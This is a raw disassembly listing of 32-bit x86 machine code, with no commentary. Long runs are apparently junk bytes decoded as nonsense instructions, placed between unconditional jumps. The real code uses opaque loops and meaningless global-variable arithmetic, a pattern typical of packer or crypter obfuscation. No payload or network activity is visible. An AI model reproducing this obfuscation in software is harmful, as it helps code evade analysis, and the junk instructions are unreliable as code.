  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0x1f14bbe7
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	or     eax,0x636a3da9
  409493:	mov    eax,ds:0x5e7a258
  409498:	adc    edx,DWORD PTR [ebp+0x473f64f]
  40949e:	inc    eax
  40949f:	jnp    0x40944c
  4094a1:	push   eax
  4094a2:	mov    bl,0xf2
  4094a4:	xor    DWORD PTR [esi],0xa209a719
  4094aa:	in     eax,0xf2
  4094ac:	je     0x409482
  4094ae:	bound  ecx,QWORD PTR [esi]
  4094b0:	or     bh,dl
  4094b2:	pop    ebx
  4094b3:	fdiv   QWORD PTR [esi]
  4094b5:	int3   
  4094b6:	push   ecx
  4094b7:	mov    es:0x77e38347,eax
  4094bd:	adc    edx,esp
  4094bf:	inc    edi
  4094c0:	repz dec esi
  4094c2:	mov    cl,0xed
  4094c4:	and    dh,dl
  4094c6:	dec    edx
  4094c7:	inc    edx
  4094c8:	cdq    
  4094c9:	fisubr DWORD PTR ds:0x7c0a6012
  4094cf:	push   ebx
  4094d0:	aaa    
  4094d1:	out    dx,eax
  4094d2:	push   ss
  4094d3:	inc    eax
  4094d4:	push   eax
  4094d5:	in     eax,0x36
  4094d7:	ret    
  4094d8:	xlat   BYTE PTR ds:[ebx]
  4094d9:	and    cl,ch
  4094db:	cld    
  4094dc:	(bad)  
  4094dd:	lods   eax,DWORD PTR ds:[esi]
  4094de:	push   0x41ce73d5
  4094e3:	jg     0x4094b2
  4094e5:	dec    ecx
  4094e6:	mov    bh,0x2e
  4094e8:	sahf   
  4094e9:	imul   edx,DWORD PTR [edx],0x3584f353
  4094ef:	adc    ecx,DWORD PTR ds:0x1b7e2aa8
  4094f5:	imul   ecx,DWORD PTR [edi+0x46],0x8b35fb2a
  4094fc:	sbb    eax,0x7ab0d1c5
  409501:	das    
  409502:	adc    bl,BYTE PTR [esi-0x4cb0a8e8]
  409508:	shl    DWORD PTR [eax],0x9b
  40950b:	and    ebp,DWORD PTR [edi]
  40950d:	fadd   QWORD PTR [eax+0x18]
  409510:	icebp  
  409511:	pop    es
  409512:	lods   al,BYTE PTR ds:[esi]
  409513:	cmp    DWORD PTR [edi+0x20],0xffffffe8
  409517:	ds push eax
  409519:	cdq    
  40951a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40951b:	in     al,0xe2
  40951d:	dec    ebp
  40951e:	push   eax
  40951f:	jb     0x409593
  409521:	stc    
  409522:	mov    esi,DWORD PTR [ebp+0x10]
  409525:	mov    DWORD PTR [esi+0x10],eax
  409528:	mov    eax,eax
  40952a:	mov    eax,DWORD PTR [ebp+0x8]
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    al,BYTE PTR [ebx+0x74]
  409540:	loope  0x409583
  409542:	or     DWORD PTR [ecx],esp
  409544:	jle    0x4095c4
  409546:	cmp    BYTE PTR [esi+0x7e],0x7e
  40954a:	fadd   QWORD PTR [ebx]
  40954c:	in     eax,0xe8
  40954e:	out    0xe2,al
  409550:	cmp    eax,0xf6ebb297
  409555:	xor    al,0x90
  409557:	sahf   
  409558:	icebp  
  409559:	out    dx,al
  40955a:	int3   
  40955b:	and    BYTE PTR [ecx],bl
  40955d:	(bad)  
  40955e:	mov    eax,0x88897d5
  409563:	loopne 0x40953f
  409565:	lods   eax,DWORD PTR ds:[esi]
  409566:	lea    ecx,[ebx]
  409568:	jno    0x409540
  40956a:	mov    cs,WORD PTR [edi-0x6a]
  40956d:	ds push ebp
  40956f:	call   0x26ccb541
  409574:	cs add al,0x1d
  409577:	leave  
  409578:	xchg   BYTE PTR [edx+eax*4-0x39ddb0aa],dl
  40957f:	push   edx
  409580:	sbb    ah,0x74
  409583:	(bad)  
  409584:	(bad)  
  409585:	std    
  409586:	or     BYTE PTR [esi+0x249f90e2],ah
  40958c:	cld    
  40958d:	jo     0x409609
  40958f:	and    eax,0xd96b163c
  409594:	(bad)  
  409595:	jmp    0x409548
  409597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409598:	or     ecx,DWORD PTR [eax+esi*8]
  40959b:	das    
  40959c:	sbb    al,BYTE PTR [ebx+ebx*1-0x38d0254]
  4095a3:	loop   0x4095fc
  4095a5:	dec    ecx
  4095a6:	jg     0x409581
  4095a8:	addr16 ret 0xdce2
  4095ac:	cmp    al,BYTE PTR [esi+ebp*1+0x25b079a7]
  4095b3:	mov    al,ds:0xb9530227
  4095b8:	jnp    0x409583
  4095ba:	and    BYTE PTR [esi-0x76],ch
  4095bd:	inc    ecx
  4095be:	daa    
  4095bf:	sahf   
  4095c0:	mov    bl,0x29
  4095c2:	cmp    ah,bh
  4095c4:	sub    dl,BYTE PTR [eax+0x61]
  4095c7:	fidiv  WORD PTR [edx]
  4095c9:	sub    DWORD PTR [eax+0x20bd9241],ebx
  4095cf:	pop    ss
  4095d0:	bound  esp,QWORD PTR ss:[edx+0x51]
  4095d4:	ss cwde 
  4095d6:	jecxz  0x409564
  4095d8:	repz in al,dx
  4095da:	mov    cl,0x6f
  4095dc:	inc    ecx
  4095dd:	scas   eax,DWORD PTR es:[edi]
  4095de:	xor    eax,ecx
  4095e0:	add    eax,edx
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    esi,DWORD PTR [esi]
  40961c:	jo     0x4095a4
  40961e:	outs   dx,BYTE PTR ds:[esi]
  40961f:	popf   
  409620:	and    DWORD PTR [esi+0x7e],edi
  409623:	push   ss
  409624:	jg     0x4096a4
  409626:	jle    0x409624
  409628:	stos   BYTE PTR es:[edi],al
  409629:	(bad)  
  40962a:	cmc    
  40962b:	ret    
  40962c:	out    0xea,al
  40962e:	xchg   ebx,eax
  40962f:	popf   
  409630:	sti    
  409631:	in     al,dx
  409632:	jmp    0x40965b
  409634:	mov    bh,0xd6
  409636:	sbb    al,0xb8
  409638:	sbb    bl,dh
  40963a:	out    0xfd,eax
  40963c:	lds    edi,FWORD PTR [eax+0x3aa0f266]
  409642:	ss repnz aaa 
  409645:	rcr    eax,0x9f
  409648:	sbb    BYTE PTR [ebx+0x448a1706],0xf8
  40964f:	xchg   ebp,eax
  409650:	test   dh,bl
  409652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409653:	xor    bh,ah
  409655:	xchg   edx,eax
  409656:	push   0x268c5250
  40965b:	mov    cs,WORD PTR [edx+0x5e]
  40965e:	add    BYTE PTR [ebp+ebx*8+0x187f4a5b],bh
  409665:	test   al,0x6c
  409667:	int3   
  409668:	sbb    ch,bl
  40966a:	daa    
  40966b:	ficom  WORD PTR [ecx+esi*1+0x30684e41]
  409672:	sbb    BYTE PTR [ebx-0x2c],dl
  409675:	es push eax
  409677:	jg     0x4096af
  409679:	push   edi
  40967a:	dec    ecx
  40967b:	jge    0x409620
  40967d:	pusha  
  40967e:	cmp    eax,0xc705b0c9
  409683:	or     cl,BYTE PTR [ecx]
  409685:	sub    al,0xb0
  409687:	inc    edi
  409688:	inc    esi
  409689:	inc    esp
  40968a:	cmp    al,0x94
  40968c:	mov    esp,0xc19b81d0
  409691:	cmp    DWORD PTR ds:[ecx+0x54854e60],edx
  409698:	fidiv  DWORD PTR [ebx+0x1e4267fe]
  40969e:	inc    ecx
  40969f:	mov    al,0x77
  4096a1:	add    dl,0xfb
  4096a4:	push   ecx
  4096a5:	mov    esp,es
  4096a7:	dec    esi
  4096a8:	test   al,0x29
  4096aa:	gs ins BYTE PTR es:[edi],dx
  4096ac:	xor    eax,0xcd1fbc26
  4096b1:	sbb    DWORD PTR [edi-0x6],edx
  4096b4:	xchg   ecx,eax
  4096b5:	push   ss
  4096b6:	popa   
  4096b7:	push   DWORD PTR [edx]
  4096b9:	hlt    
  4096ba:	sbb    eax,0xc76a48af
  4096bf:	cmp    ch,BYTE PTR [esi+ebx*8]
  4096c2:	out    dx,eax
  4096c3:	fld    QWORD PTR [edi-0x16101985]
  4096c9:	into   
  4096ca:	into   
  4096cb:	jns    0x4096be
  4096cd:	sub    eax,ebx
  4096cf:	pop    ebx
  4096d0:	inc    esp
  4096d1:	outs   dx,DWORD PTR ds:[esi]
  4096d2:	dec    eax
  4096d3:	cmp    eax,0x4f30b209
  4096d8:	(bad)  
  4096d9:	(bad)  
  4096da:	push   esi
  4096db:	shl    ebx,1
  4096dd:	pusha  
  4096de:	ins    DWORD PTR es:[edi],dx
  4096df:	scas   eax,DWORD PTR es:[edi]
  4096e0:	popf   
  4096e1:	fcomip st,st(3)
  4096e3:	dec    esi
  4096e4:	and    ch,BYTE PTR [ebx]
  4096e6:	call   0x119e:0x119d4c62
  4096ed:	pop    ecx
  4096ee:	aaa    
  4096ef:	and    eax,0xb1572d3f
  4096f4:	imul   al
  4096f6:	mov    cl,0xeb
  4096f8:	xchg   DWORD PTR [ebx],ebx
  4096fa:	fdivp  st(5),st
  4096fc:	daa    
  4096fd:	add    bl,BYTE PTR [edx+0x25965eea]
  409703:	sub    al,0x7
  409705:	add    al,0x74
  409707:	test   ecx,ebp
  409709:	ins    DWORD PTR es:[edi],dx
  40970a:	fwait
  40970b:	dec    eax
  40970c:	mov    ah,0xe
  40970e:	(bad)  
  40970f:	xchg   esp,eax
  409710:	and    DWORD PTR [esi-0x9],edx
  409713:	mov    BYTE PTR [eax+0x17],bh
  409716:	pminsw mm0,QWORD PTR [ebx-0x8d2cab9]
  40971d:	push   ecx
  40971e:	pop    es
  40971f:	inc    edx
  409720:	cld    
  409721:	pop    eax
  409722:	sub    eax,0x1dc37aae
  409727:	add    al,BYTE PTR [esp+eax*4]
  40972a:	jmp    0x46c8:0x88f47593
  409731:	sbb    DWORD PTR [ebp+0x6011246b],eax
  409737:	sti    
  409738:	add    BYTE PTR [ebx+0x60840e87],ch
  40973e:	mov    ebp,0x13a795f4
  409743:	inc    esi
  409744:	adc    dl,BYTE PTR [ebp-0x4f]
  409747:	je     0x40978f
  409749:	jae    0x409745
  40974b:	std    
  40974c:	jl     0x409703
  40974e:	lods   al,BYTE PTR ds:[esi]
  40974f:	push   ecx
  409750:	sbb    edx,eax
  409752:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409759:	or     DWORD PTR ds:0x4245ae,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412370,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41abd6
  409776:	adc    DWORD PTR ds:0x4245ca,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417e59,0x412370
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x41235c,0x41abd2
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415115,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4245ba
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	add    edx,ecx
  4097c1:	dec    edi
  4097c2:	inc    edx
  4097c3:	mov    ch,0x26
  4097c5:	jle    0x409845
  4097c7:	push   ss
  4097c8:	jg     0x409848
  4097ca:	jle    0x4097fe
  4097cc:	jmp    0x3088:0x1886a3fe
  4097d3:	mov    cl,0x17
  4097d5:	jle    0x4097f1
  4097d7:	lods   al,BYTE PTR ds:[esi]
  4097d8:	and    al,0xc0
  4097da:	add    eax,DWORD PTR [esi]
  4097dc:	cmp    ch,al
  4097de:	adc    eax,0x2ada1fa0
  4097e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097e4:	imul   ebp,DWORD PTR [esi+0x15],0x849f4c58
  4097eb:	or     bh,BYTE PTR [edi+edi*1]
  4097ee:	cs mov al,fs:0xb9cda6ca
  4097f5:	mov    BYTE PTR [ebp+0x508638fa],dh
  4097fb:	fld    QWORD PTR [ebx+0xf]
  4097fe:	aad    0x60
  409800:	xor    al,0xc0
  409802:	or     al,bh
  409804:	popaw  
  409806:	push   ebx
  409807:	loopne 0x409820
  409809:	mov    dl,0x48
  40980b:	fwait
  40980c:	clc    
  40980d:	dec    esi
  40980e:	sub    esp,DWORD PTR [ebx]
  409810:	push   esp
  409811:	(bad)  
  409812:	(bad)  
  409813:	sahf   
  409814:	cmp    al,0x8
  409816:	mov    eax,ds:0x471309dc
  40981b:	repz sar DWORD PTR [ecx],0xc9
  40981f:	leave  
  409820:	push   ecx
  409821:	das    
  409822:	shl    ebx,cl
  409824:	retf   
  409825:	xchg   edx,eax
  409826:	(bad)  
  409827:	shl    DWORD PTR [ebp+0x65],1
  40982a:	add    bl,BYTE PTR [edi]
  40982c:	retf   0xf698
  40982f:	xchg   edi,eax
  409830:	(bad)  
  409831:	rol    dh,cl
  409833:	test   esp,0xa12b7f0
  409839:	bnd jne 0x409872
  40983c:	int3   
  40983d:	jae    0x409862
  40983f:	add    ebp,esi
  409841:	fisub  WORD PTR [ebp+0x13]
  409844:	mov    edi,0xc6547010
  409849:	jmp    0x8e741922
  40984e:	sbb    ecx,DWORD PTR [edi]
  409850:	mov    WORD PTR [ebx+0x49],fs
  409853:	stos   DWORD PTR es:[edi],eax
  409854:	xor    esp,esi
  409856:	add    al,al
  409858:	imul   ebx,ecx,0xffffffaf
  40985b:	sub    edi,DWORD PTR [esi+ecx*2-0x4b]
  40985f:	inc    ecx
  409860:	in     eax,0x4d
  409862:	xor    dl,ch
  409864:	inc    ecx
  409865:	pop    ecx
  409866:	mov    ebx,0xfadaa5e3
  40986b:	stos   BYTE PTR es:[edi],al
  40986c:	cmp    ch,BYTE PTR [edx]
  40986e:	sbb    ch,BYTE PTR ds:0x8184abb0
  409874:	(bad)  
  409876:	in     al,dx
  409877:	push   es
  409878:	xchg   edx,eax
  409879:	and    eax,0x85a5392d
  40987e:	pop    ebx
  40987f:	or     eax,ebp
  409881:	mov    ch,0xdc
  409883:	xchg   ebp,eax
  409884:	mov    ds,WORD PTR [esi+0x1a]
  409887:	mov    ch,0x13
  409889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40988a:	daa    
  40988b:	je     0x4098ea
  40988d:	inc    ebp
  40988e:	or     ch,BYTE PTR [ebp-0x40]
  409891:	nop
  409892:	sti    
  409893:	shl    BYTE PTR [ebp+0x55],0x39
  409897:	js     0x40988e
  409899:	xchg   BYTE PTR [edi-0x40],ah
  40989c:	or     ah,cl
  40989e:	pop    ebx
  40989f:	jge    0x40991d
  4098a1:	jmp    0x409879
  4098a3:	out    dx,eax
  4098a4:	jmp    0x40984d
  4098a6:	out    0x2d,eax
  4098a8:	jp     0x4098cb
  4098aa:	cmp    bh,ch
  4098ac:	sar    DWORD PTR [esi+0x48],0xcd
  4098b0:	push   ds
  4098b1:	push   edi
  4098b2:	outs   dx,DWORD PTR ds:[esi]
  4098b3:	enter  0x1f37,0x70
  4098b7:	adc    eax,0x2d538b8
  4098bc:	pop    es
  4098bd:	sub    BYTE PTR [ebx+0x6f227b76],bh
  4098c3:	ds jp  0x409939
  4098c6:	jl     0x409947
  4098c8:	pop    esp
  4098c9:	xchg   ebp,eax
  4098ca:	arpl   bp,cx
  4098cc:	mov    bh,0x5a
  4098ce:	jb     0x409912
  4098d0:	mov    ah,0xcf
  4098d2:	data16 and BYTE PTR [esi+eax*1-0x55],bl
  4098d7:	cdq    
  4098d8:	sbb    BYTE PTR [edi+0x43],bl
  4098db:	inc    ebx
  4098dc:	rcl    BYTE PTR [eax+ebp*8+0x7a],1
  4098e0:	repnz push esp
  4098e2:	jl     0x40994f
  4098e4:	stc    
  4098e5:	mov    bh,BYTE PTR [ecx]
  4098e7:	dec    ebp
  4098e8:	xor    al,0x64
  4098ea:	lods   eax,DWORD PTR ds:[esi]
  4098eb:	outs   dx,DWORD PTR ds:[esi]
  4098ec:	sbb    al,0xc1
  4098ee:	mov    eax,0xd6115d70
  4098f3:	mov    eax,DWORD PTR [ebp+0x14]
  4098f6:	and    DWORD PTR ds:0x412364,0x0
  409900:	mov    edx,DWORD PTR ds:0x412364
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x412364,edx
  40990d:	cmp    DWORD PTR ds:0x412364,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x412364,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x412364
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x412364,edx
  40994a:	cmp    DWORD PTR ds:0x412364,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0xfdbdf14c
  409977:	aaa    
  409978:	ins    DWORD PTR es:[edi],dx
  409979:	daa    
  40997a:	jle    0x4099fa
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x409996
  409981:	or     al,0x88
  409983:	shr    DWORD PTR [esi],cl
  409985:	jmp    0x62c2:0xedd86dee
  40998c:	fdivr  st,st(4)
  40998e:	and    DWORD PTR [eax],ebp
  409990:	(bad)  
  409992:	adc    ebx,eax
  409994:	pop    ebp
  409995:	jb     0x409988
  409997:	in     al,0xc0
  409999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40999a:	hlt    
  40999b:	(bad)  
  40999d:	sub    DWORD PTR [esi+edx*2],ebx
  4099a0:	pushf  
  4099a1:	or     al,cl
  4099a3:	dec    eax
  4099a4:	mov    ecx,ecx
  4099a6:	fbstp  TBYTE PTR [edi-0x7e]
  4099a9:	inc    edx
  4099aa:	int    0x9a
  4099ac:	and    BYTE PTR [edx],0x99
  4099af:	xchg   ebp,eax
  4099b0:	sar    BYTE PTR [ebx-0x5691d40a],cl
  4099b6:	rcr    esp,0xc5
  4099b9:	or     BYTE PTR [eax-0x44],ch
  4099bc:	into   
  4099bd:	xchg   ebp,eax
  4099be:	outs   dx,DWORD PTR ds:[esi]
  4099bf:	repnz sbb eax,0x26b62bae
  4099c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099c6:	cs aad 0xe8
  4099c9:	pop    ebp
  4099ca:	xor    ecx,DWORD PTR [ecx]
  4099cc:	aaa    
  4099cd:	scas   eax,DWORD PTR es:[edi]
  4099ce:	aas    
  4099cf:	xchg   BYTE PTR [ecx-0x70],ah
  4099d2:	ss ins BYTE PTR es:[edi],dx
  4099d4:	js     0x4099ca
  4099d6:	jne    0x409a25
  4099d8:	test   ebx,eax
  4099da:	or     bh,ch
  4099dc:	xor    bl,bl
  4099de:	aas    
  4099df:	scas   eax,DWORD PTR es:[edi]
  4099e0:	adc    BYTE PTR [ecx+0x31],0xd
  4099e4:	pop    esi
  4099e5:	daa    
  4099e6:	cmp    edi,DWORD PTR [ebx+0x3f]
  4099e9:	jb     0x409983
  4099eb:	sbb    ecx,ecx
  4099ed:	adc    eax,0x8dfc6c13
  4099f2:	lods   eax,DWORD PTR ds:[esi]
  4099f3:	pushf  
  4099f4:	mov    ds:0xb634eaf8,eax
  4099f9:	pop    ebp
  4099fa:	jecxz  0x4099a6
  4099fc:	dec    ecx
  4099fd:	dec    edx
  4099fe:	imul   eax,DWORD PTR [ecx],0x5fb13781
  409a04:	es stos DWORD PTR es:[edi],eax
  409a06:	pop    es
  409a07:	sbb    eax,0xe07eaf62
  409a0c:	int    0x93
  409a0e:	rcl    DWORD PTR [esi],1
  409a10:	shl    DWORD PTR [esi-0x1c],0xc5
  409a14:	popa   
  409a15:	push   ebx
  409a16:	jp     0x409a4d
  409a18:	sub    eax,0x143613e
  409a1d:	mov    eax,ds:0x905834e5
  409a22:	fcmovnb st,st(6)
  409a24:	ins    DWORD PTR es:[edi],dx
  409a25:	adc    al,0x16
  409a27:	mov    ebp,0x3539d86c
  409a2c:	lock fs cmp dh,dl
  409a30:	push   0x3dcc8f58
  409a35:	fadd   DWORD PTR [esi+0x7a]
  409a38:	ss pop esp
  409a3a:	out    dx,eax
  409a3b:	outs   dx,BYTE PTR ds:[esi]
  409a3c:	ds mov ebp,0x26719d3a
  409a42:	inc    edi
  409a43:	xchg   ebp,eax
  409a44:	xor    eax,0x481eb0cf
  409a49:	cld    
  409a4a:	adc    eax,0x2514ec13
  409a4f:	sti    
  409a50:	jb     0x409a8d
  409a52:	cmp    ah,cl
  409a54:	adc    eax,DWORD PTR [esi-0x4d]
  409a57:	mov    ch,0x50
  409a59:	pusha  
  409a5a:	ficomp WORD PTR [ebp+0x35b6f930]
  409a60:	mov    eax,0xed99ea45
  409a65:	loopne 0x4099f0
  409a67:	mov    dh,BYTE PTR ds:0x211a90bf
  409a6d:	sub    al,0x73
  409a6f:	mov    edi,0x9658d5a6
  409a74:	call   0xbd37:0xd5ff0bed
  409a7b:	fist   WORD PTR [eax+0x4a]
  409a7e:	jb     0x409a78
  409a80:	and    DWORD PTR [edx-0x78],esi
  409a83:	mov    edi,0x6453f232
  409a88:	mov    al,0x35
  409a8a:	scas   eax,DWORD PTR es:[edi]
  409a8b:	add    dl,bh
  409a8d:	aam    0x9d
  409a8f:	pop    ss
  409a90:	pusha  
  409a91:	rcl    DWORD PTR [ecx],1
  409a93:	cmp    BYTE PTR [ecx+0x2b9ebfda],dl
  409a99:	into   
  409a9a:	fwait
  409a9b:	cmp    DWORD PTR [ebx-0x2c769886],edi
  409aa1:	int    0x57
  409aa3:	push   ecx
  409aa4:	bound  eax,QWORD PTR [esi+0x7e]
  409aa7:	mov    ah,0x89
  409aa9:	inc    edx
  409aaa:	or     BYTE PTR [ebx+0x558b1c45],cl
  409ab0:	adc    BYTE PTR [ecx+0x458b0c42],cl
  409ab6:	and    BYTE PTR [ebx+0x42891055],cl
  409abc:	adc    BYTE PTR [ebx+0x14458bc0],cl
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417e4d,0x412378
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4245b6
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415111,0x412368
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415115,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412378,0x417e41
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4245c2,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415119,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412378,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415101,0x415109
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4245c2,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417e41
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x412354,0x4245b2
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x412354,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41abda
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4245c2,0x417e4d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41abca,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41abca
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41abca,ecx
  409bf0:	cmp    DWORD PTR ds:0x41abca,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41abca,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412370,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412370,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412370,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41abe2
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412370
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412370,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4245b2,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415119,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x412364,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41510d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41abda,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415105,0x41abe2
  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412374,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415101,0x11
  409cf2:	cmp    DWORD PTR ds:0x415101,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415101,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415101,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415101
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415101,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415101
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415101,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41abd6,0x12
  409d50:	cmp    DWORD PTR ds:0x41abd6,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41abd6,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41ad52
  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41abd6,0x4
  409d7c:	jne    0x409d8f
  409d82:	mov    edx,DWORD PTR ds:0x41abd6
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41abd6,edx
  409d8f:	mov    edx,DWORD PTR ds:0x41abd6
  409d95:	dec    edx
